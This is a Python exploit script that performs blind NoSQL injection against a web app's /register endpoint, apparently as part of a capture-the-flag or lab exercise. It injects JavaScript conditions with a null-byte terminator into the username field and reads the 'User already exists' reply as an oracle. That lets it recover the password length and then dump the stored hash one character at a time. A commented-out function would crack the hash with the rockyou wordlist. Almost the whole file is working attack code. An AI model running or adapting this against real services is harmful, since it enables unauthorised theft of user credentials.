import requests, urllib.parse, sys, hashlib

url = "http://localhost:8000/register"
proxies = {'http':'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'}

def nosqli_request(inj):
    nq = f"' && this.password.{inj}"
    nr = urllib.parse.quote(nq)
    payload = f"username=anton{nr}%00&password=random"
    header = {"Content-Type": "application/x-www-form-urlencoded"}
    r = requests.post(url, headers=header, data=payload, proxies=proxies)
    if 'User already exists' in r.text:
        return True
    return False

def get_length():
    length = 0
    for i in range(100):
        if nosqli_request(f'length=={i}'):
            length = i
            break
    return length

def dump_password(len):
    password = ''
    for i in range(len):
        for j in range(32, 127):
            if nosqli_request(f'substr({i},{i+1}).charCodeAt(0)=={j}'):
                password += chr(j)
                extracted = chr(j)
                sys.stdout.write(extracted)
                sys.stdout.flush()
                break
    return password

# [Untested] i create this since dumped hash is common sha256 for some account (helped by gpt)
# def decrypt_sha256(hash):
#     with open('rockyou.txt', 'r', encoding='latin-1') as f:
#         for line in f:
#             line = line.strip()
#             if hashlib.sha256(line.encode()).hexdigest() == hash:
#                 return line
#     return False

len = get_length()
hash = dump_password(len)
# password = decrypt_sha256(hash)
print(f"\n[+] Password hash: {hash}")
# print(f"[+] Decrypyted Password: {password}")

